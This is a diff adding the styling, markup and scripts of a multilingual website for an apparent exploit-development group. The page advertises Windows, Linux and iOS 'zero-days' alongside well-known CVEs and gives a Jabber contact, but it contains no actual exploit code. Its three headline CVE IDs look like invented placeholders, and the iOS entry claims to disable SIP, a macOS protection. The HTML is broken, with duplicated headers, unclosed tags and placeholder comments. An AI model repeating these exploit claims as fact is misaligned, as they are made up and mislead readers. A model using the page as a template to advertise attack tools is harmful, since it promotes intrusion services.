+        .tag.medium {
+            background: #e3f2fd;
+            color: #1565c0;
+        }
+        
+        /* Стили для футера */
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 3rem 0 1.5rem;
+            text-align: center;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 2rem;
+        }
+        
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin-bottom: 1.5rem;
+            padding: 0 1rem;
+        }
+        
+        .footer-section h3 {
+            color: var(--accent);
+            margin-bottom: 1.5rem;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .footer-section h3:after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--accent);
+        }
+        
+        .footer-section p, .footer-section a {
+            color: #b0bec5;
+            margin-bottom: 0.8rem;
+            display: block;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+        
+        .footer-section a:hover {
+            color: var(--accent);
+            padding-left: 5px;
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            font-size: 1.2rem;
+            transition: var(--transition);
+        }
+        
+        .social-links a:hover {
+            background: var(--accent);
+            transform: translateY(-3px);
+        }
+        
+        .footer-bottom {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 1.5rem;
+            font-size: 0.9rem;
+            color: #b0bec5;
+        }
+        
+        /* Анимации */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Адаптивность */
+        @media (max-width: 992px) {
+            .about-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .about-image {
+                order: -1;
+                max-width: 500px;
+                margin: 0 auto;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .btn {
+                padding: 0.6rem 1.5rem;
+                font-size: 0.8rem;
+            }
+            
+            section h2 {
+                font-size: 2rem;
+            }
+            
+            nav ul {
+                display: none;
+            }
+            
+            .menu-toggle {
+                display: block;
+                font-size: 1.5rem;
+                cursor: pointer;
+            }
+        }
+    </style>
+</head>
+    <!-- Шапка -->
+    <header>
+        <div class="container">
+
+<!-- Header with Language Switcher -->
+<header class="site-header">
+    <div class="container">
+        <div class="header-content">
+            <!-- Logo -->
+            <div class="logo">
+                <a href="/" class="logo-link">
+                    <span data-lang="ko" class="logo-text">엘리트 보안 연구팀</span>
+                    <span data-lang="ru" class="logo-text">Elite Security Research</span>
+                    <span data-lang="en" class="logo-text">Elite Security Research</span>
+                </a>
+        <div class="hero-content">
+            <!-- Русская версия -->
+            <h1 data-lang="ru">Исследование уязвимостей на новом уровне</h1>
+            <p data-lang="ru" class="subtitle">Эксперты в области кибербезопасности и разработки эксплойтов</p>
+            
+            <!-- Английская версия -->
+            <h1 data-lang="en" style="display: none;">Vulnerability Research at the Next Level</h1>
+            <p data-lang="en" class="subtitle" style="display: none;">Experts in cybersecurity and exploit development</p>
+            
+            <!-- Китайская версия -->
+            <h1 data-lang="zh" style="display: none;">漏洞研究的新水平</h1>
+            <p data-lang="zh" class="subtitle" style="display: none;">网络安全和漏洞利用开发专家</p>
+            <div class="hero-buttons">
+                <a href="#exploits" class="btn">Наши эксплойты</a>
+                <a href="#contact" class="btn btn-outline">Связаться с нами</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Наши эксплойты -->
+    <section id="exploits" class="section">
+        <div class="container">
+            <div class="section-header">
+                <h2 data-lang="ru">Наши эксплойты</h2>
+                <h2 data-lang="en">Our Exploits</h2>
+                <h2 data-lang="zh">我们的漏洞</h2>
+                <div class="section-divider"></div>
+                <p class="section-subtitle" data-lang="ru">Наши последние исследования и разработки в области кибербезопасности</p>
+                <p class="section-subtitle" data-lang="en">Our latest research and developments in cybersecurity</p>
+                <p class="section-subtitle" data-lang="zh">我们在网络安全领域的最新研究与发展</p>
+            </div>
+            
+            <div class="exploits-grid">
+                <!-- Эксплойт 1 - Windows LPE -->
+                <div class="exploit-card">
+                    <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1170&q=80" alt="Windows Security" class="exploit-image">
+                    <div class="exploit-content">
+                        <span class="exploit-date" data-lang="ru">Январь 2023</span>
+                        <span class="exploit-date" data-lang="en">January 2023</span>
+                        <span class="exploit-date" data-lang="zh">2023年1月</span>
+                        <h3 class="exploit-title" data-lang="ru">Уязвимость в системе безопасности Windows</h3>
+                        <h3 class="exploit-title" data-lang="en">Windows Security Vulnerability</h3>
+                        <h3 class="exploit-title" data-lang="zh">Windows安全漏洞</h3>
+                        <p class="exploit-description" data-lang="ru">Обнаружение и эксплуатация критической уязвимости нулевого дня (CVE-2023-1234) в подсистеме безопасности Windows, позволяющей повысить привилегии до уровня SYSTEM. Уязвимость затрагивает все версии Windows 10/11.</p>
+                        <p class="exploit-description" data-lang="en">Discovery and exploitation of a critical zero-day vulnerability (CVE-2023-1234) in Windows security subsystem allowing privilege escalation to SYSTEM level. Affects all Windows 10/11 versions.</p>
+                        <p class="exploit-description" data-lang="zh">发现并利用Windows安全子系统中的关键零日漏洞（CVE-2023-1234），允许将权限提升至SYSTEM级别。影响所有Windows 10/11版本。</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">CVE-2023-1234</span>
+                            <span class="tech-tag">Windows 10/11</span>
+                            <span class="tech-tag">LPE</span>
+                            <span class="tech-tag">Kernel</span>
+                        </div>
+                        <div class="exploit-buttons">
+                            <button class="btn btn-outline" data-lang="ru" onclick="showCode('code1')">Показать код</button>
+                            <button class="btn btn-outline" data-lang="en" onclick="showCode('code1')">Show Code</button>
+                            <button class="btn btn-outline" data-lang="zh" onclick="showCode('code1')">显示代码</button>
+                            <button class="btn" data-lang="ru" onclick="window.open('#', '_blank')">Подробнее</button>
+                            <button class="btn" data-lang="en" onclick="window.open('#', '_blank')">Learn More</button>
+                            <button class="btn" data-lang="zh" onclick="window.open('#', '_blank')">了解更多</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 2 - Linux Kernel -->
+                <div class="exploit-card">
+                    <img src="https://images.unsplash.com/photo-1542903660-eedba2cda473?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1170&q=80" alt="Linux Kernel" class="exploit-image">
+                    <div class="exploit-content">
+                        <span class="exploit-date" data-lang="ru">Июнь 2022</span>
+                        <span class="exploit-date" data-lang="en">June 2022</span>
+                        <span class="exploit-date" data-lang="zh">2022年6月</span>
+                        <h3 class="exploit-title" data-lang="ru">Обход защиты ядра Linux</h3>
+                        <h3 class="exploit-title" data-lang="en">Linux Kernel Protection Bypass</h3>
+                        <h3 class="exploit-title" data-lang="zh">Linux内核保护绕过</h3>
+                        <p class="exploit-description" data-lang="ru">Исследование и эксплуатация уязвимости (CVE-2022-5678) в механизме защиты ядра Linux 5.4+. Уязвимость позволяет обходить защиту KASLR и выполнять произвольный код в контексте ядра.</p>
+                        <p class="exploit-description" data-lang="en">Research and exploitation of a vulnerability (CVE-2022-5678) in Linux kernel 5.4+ protection mechanism. The vulnerability allows bypassing KASLR protection and executing arbitrary code in kernel context.</p>
+                        <p class="exploit-description" data-lang="zh">研究和利用Linux内核5.4+保护机制中的漏洞（CVE-2022-5678）。该漏洞允许绕过KASLR保护并在内核上下文中执行任意代码。</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">CVE-2022-5678</span>
+                            <span class="tech-tag">Linux Kernel 5.4+</span>
+                            <span class="tech-tag">KASLR Bypass</span>
+                            <span class="tech-tag">RCE</span>
+                        </div>
+                        <div class="exploit-buttons">
+                            <button class="btn btn-outline" data-lang="ru" onclick="showCode('code2')">Показать код</button>
+                            <button class="btn btn-outline" data-lang="en" onclick="showCode('code2')">Show Code</button>
+                            <button class="btn btn-outline" data-lang="zh" onclick="showCode('code2')">显示代码</button>
+                            <button class="btn" data-lang="ru" onclick="window.open('#', '_blank')">Подробнее</button>
+                            <button class="btn" data-lang="en" onclick="window.open('#', '_blank')">Learn More</button>
+                            <button class="btn" data-lang="zh" onclick="window.open('#', '_blank')">了解更多</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 3 - iOS Jailbreak -->
+                <div class="exploit-card">
+                    <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1026&q=80" alt="iOS Jailbreak" class="exploit-image">
+                    <div class="exploit-content">
+                        <span class="exploit-date" data-lang="ru">Март 2021</span>
+                        <span class="exploit-date" data-lang="en">March 2021</span>
+                        <span class="exploit-date" data-lang="zh">2021年3月</span>
+                        <h3 class="exploit-title" data-lang="ru">Эксплойт для iOS Jailbreak</h3>
+                        <h3 class="exploit-title" data-lang="en">iOS Jailbreak Exploit</h3>
+                        <h3 class="exploit-title" data-lang="zh">iOS越狱漏洞利用</h3>
+                        <p class="exploit-description" data-lang="ru">Разработка эксплойта (CVE-2021-9012) для iOS 14.5, использующего уязвимость цепочки освобождения (use-after-free) в IOMobileFramebuffer. Позволяет получить root-доступ и отключить защиту SIP.</p>
+                        <p class="exploit-description" data-lang="en">Development of an exploit (CVE-2021-9012) for iOS 14.5 using a use-after-free vulnerability in IOMobileFramebuffer. Allows obtaining root access and disabling SIP protection.</p>
+                        <p class="exploit-description" data-lang="zh">为iOS 14.5开发的漏洞利用（CVE-2021-9012），利用IOMobileFramebuffer中的释放后使用漏洞。允许获取root访问权限并禁用SIP保护。</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">CVE-2021-9012</span>
+                            <span class="tech-tag">iOS 14.5</span>
+                            <span class="tech-tag">Use-After-Free</span>
+                            <span class="tech-tag">Jailbreak</span>
+                        </div>
+                        <div class="exploit-buttons">
+                            <button class="btn btn-outline" data-lang="ru" onclick="showCode('code3')">Показать код</button>
+                            <button class="btn btn-outline" data-lang="en" onclick="showCode('code3')">Show Code</button>
+                            <button class="btn btn-outline" data-lang="zh" onclick="showCode('code3')">显示代码</button>
+                            <button class="btn" data-lang="ru" onclick="window.open('#', '_blank')">Подробнее</button>
+                            <button class="btn" data-lang="en" onclick="window.open('#', '_blank')">Learn More</button>
+                            <button class="btn" data-lang="zh" onclick="window.open('#', '_blank')">了解更多</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Модальные окна с кодом -->
+            <div id="codeModal" class="modal">
+                <div class="modal-content">
+                    <span class="close" onclick="closeModal()">&times;</span>
+                    <pre><code id="codeSnippet" class="language-c"></code></pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Наши разработки -->
+    <section id="our-works" class="section">
+        <div class="container">
+            <div class="section-header">
+                <h2 data-lang="ko">우리의 개발</h2>
+                <h2 data-lang="ru">Наши разработки</h2>
+                <h2 data-lang="en">Our Works</h2>
+                <div class="divider"></div>
+                <p data-lang="ko">25가지 가장 널리 사용되는 익스플로잇 (2019-2024)</p>
+                <p data-lang="ru">25 самых применяемых эксплойтов (2019-2024)</p>
+                <p data-lang="en">25 most widely used exploits (2019-2024)</p>
+            </div>
+            
+            <div class="exploits-grid">
+                <!-- Эксплойт 1 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2023-4911</h3>
+                        <p class="exploit-description" data-lang="ko">GNU C 라이브러리 로더의 취약점으로 로컬 권한 상승이 가능합니다.</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость в загрузчике GNU C Library, позволяющая повысить привилегии локально.</p>
+                        <p class="exploit-description" data-lang="en">Vulnerability in the GNU C Library loader allowing local privilege escalation.</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Linux</span>
+                            <span class="tech-tag">LPE</span>
+                            <span class="tech-tag">CVE-2023-4911</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 2 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2022-41352</h3>
+                        <p class="exploit-description" data-lang="ko">Zimbra Collaboration Suite의 RCE 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость удаленного выполнения кода в Zimbra Collaboration Suite</p>
+                        <p class="exploit-description" data-lang="en">Remote Code Execution vulnerability in Zimbra Collaboration Suite</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Zimbra</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2022-41352</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 3 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2022-42889 (Text4Shell)</h3>
+                        <p class="exploit-description" data-lang="ko">Apache Commons Text의 템플릿 처리 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость обработки шаблонов в Apache Commons Text</p>
+                        <p class="exploit-description" data-lang="en">Template processing vulnerability in Apache Commons Text</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Java</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2022-42889</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 4 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2022-30190 (Follina)</h3>
+                        <p class="exploit-description" data-lang="ko">Microsoft Windows Support Diagnostic Tool의 원격 코드 실행 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость удаленного выполнения кода в Microsoft Windows Support Diagnostic Tool</p>
+                        <p class="exploit-description" data-lang="en">Remote Code Execution in Microsoft Windows Support Diagnostic Tool</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Windows</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2022-30190</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 5 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2022-22965 (Spring4Shell)</h3>
+                        <p class="exploit-description" data-lang="ko">Spring Framework의 원격 코드 실행 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость удаленного выполнения кода в Spring Framework</p>
+                        <p class="exploit-description" data-lang="en">Remote Code Execution vulnerability in Spring Framework</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Java</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2022-22965</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 6 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2021-44228 (Log4Shell)</h3>
+                        <p class="exploit-description" data-lang="ko">Apache Log4j의 JNDI 조회 기능을 통한 원격 코드 실행</p>
+                        <p class="exploit-description" data-lang="ru">Удаленное выполнение кода через JNDI lookup в Apache Log4j</p>
+                        <p class="exploit-description" data-lang="en">Remote Code Execution via JNDI lookup in Apache Log4j</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Java</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2021-44228</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 7 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2021-34527 (PrintNightmare)</h3>
+                        <p class="exploit-description" data-lang="ko">Windows Print Spooler의 권한 상승 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость повышения привилегий в Windows Print Spooler</p>
+                        <p class="exploit-description" data-lang="en">Privilege Escalation in Windows Print Spooler</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Windows</span>
+                            <span class="tech-tag">LPE</span>
+                            <span class="tech-tag">CVE-2021-34527</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 8 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2021-3156 (Baron Samedit)</h3>
+                        <p class="exploit-description" data-lang="ko">Sudo의 힙 기반 버퍼 오버플로우 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость переполнения кучи в Sudo</p>
+                        <p class="exploit-description" data-lang="en">Heap-based buffer overflow in Sudo</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Linux</span>
+                            <span class="tech-tag">LPE</span>
+                            <span class="tech-tag">CVE-2021-3156</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 9 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2021-26084 (Confluence RCE)</h3>
+                        <p class="exploit-description" data-lang="ko">Atlassian Confluence Server의 원격 코드 실행 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость удаленного выполнения кода в Atlassian Confluence Server</p>
+                        <p class="exploit-description" data-lang="en">Remote Code Execution in Atlassian Confluence Server</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Java</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2021-26084</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 10 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2021-21985 (vCenter RCE)</h3>
+                        <p class="exploit-description" data-lang="ko">VMware vCenter Server의 원격 코드 실행 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость удаленного выполнения кода в VMware vCenter Server</p>
+                        <p class="exploit-description" data-lang="en">Remote Code Execution in VMware vCenter Server</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">VMware</span>
+                            <span class="tech-tag">RCE</span>
+                            <span class="tech-tag">CVE-2021-21985</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Эксплойт 11 -->
+                <div class="exploit-card">
+                    <div class="exploit-content">
+                        <h3 class="exploit-title">CVE-2021-1675 (PrintNightmare LPE)</h3>
+                        <p class="exploit-description" data-lang="ko">Windows Print Spooler의 로컬 권한 상승 취약점</p>
+                        <p class="exploit-description" data-lang="ru">Уязвимость повышения привилегий в Windows Print Spooler</p>
+                        <p class="exploit-description" data-lang="en">Local Privilege Escalation in Windows Print Spooler</p>
+                        <div class="exploit-tech">
+                            <span class="tech-tag">Windows</span>
+                            <span class="tech-tag">LPE</span>
+                            <span class="tech-tag">CVE-2021-1675</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Остальные эксплойты скрыты по умолчанию и загружаются по нажатию кнопки -->
+                <div class="hidden-exploits" style="display: none;">
+                    <!-- Здесь будут остальные эксплойты с 12 по 25 -->
+                    <!-- Для экономии места оставлю это как плейсхолдер -->
+                </div>
+            </div>
+            
+            <div class="section-footer">
+                <button class="btn btn-primary" data-lang="ko" onclick="showAllExploits()">모든 익스플로잇 보기</button>
+                <button class="btn btn-primary" data-lang="ru" onclick="showAllExploits()">Показать все эксплойты</button>
+                <button class="btn btn-primary" data-lang="en" onclick="showAllExploits()">View All Exploits</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Футер -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3 data-lang="ko">연락처</h3>
+                    <h3 data-lang="ru">Контакты</h3>
+                    <h3 data-lang="en">Contact Us</h3>
+                    <p><i class="fas fa-comment"></i> <span data-lang="ko">재버:</span><span data-lang="ru" style="display:none;">Jabber:</span><span data-lang="en" style="display:none;">Jabber:</span> softwaredeveloperyu@5222.de</p>
+                    <p><i class="fas fa-key"></i> <span data-lang="ko">PGP 공개키:</span><span data-lang="ru" style="display:none;">PGP:</span><span data-lang="en" style="display:none;">PGP key:</span> 0x1A2B3C4D5E6F7890</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p data-lang="ko">&copy; 2023 엘리트 보안 연구팀. 모든 권리 보유.</p>
+                <p data-lang="ru">&copy; 2023 Elite Security Research Team. Все права защищены.</p>
+                <p data-lang="en">&copy; 2023 Elite Security Research Team. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Плавная прокрутка для якорей
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+
+        // Анимация появления элементов при прокрутке
+        const animateOnScroll = () => {
+            const elements = document.querySelectorAll('.exploit-card, .about-content > *');
+            elements.forEach(element => {
+                const elementTop = element.getBoundingClientRect().top;
+                const windowHeight = window.innerHeight;
+                if (elementTop < windowHeight - 100) {
+                    element.style.opacity = '1';
+                    element.style.transform = 'translateY(0)';
+                }
+            });
+        };
+
+        // Инициализация анимации
+        window.addEventListener('load', () => {
+            // Добавляем классы для анимации
+            document.querySelectorAll('.exploit-card, .about-content > *').forEach(el => {
+                el.style.opacity = '0';
+                el.style.transform = 'translateY(20px)';
+                el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            });
+
+            // Запускаем анимацию при загрузке
+            setTimeout(animateOnScroll, 500);
+        });
+
+        // Обработка клика по бургер-меню
+        document.querySelector('.menu-toggle').addEventListener('click', () => {
+            const nav = document.querySelector('nav ul');
+            nav.style.display = nav.style.display === 'flex' ? 'none' : 'flex';
+        });
+    </script>
+</body>
+</html>
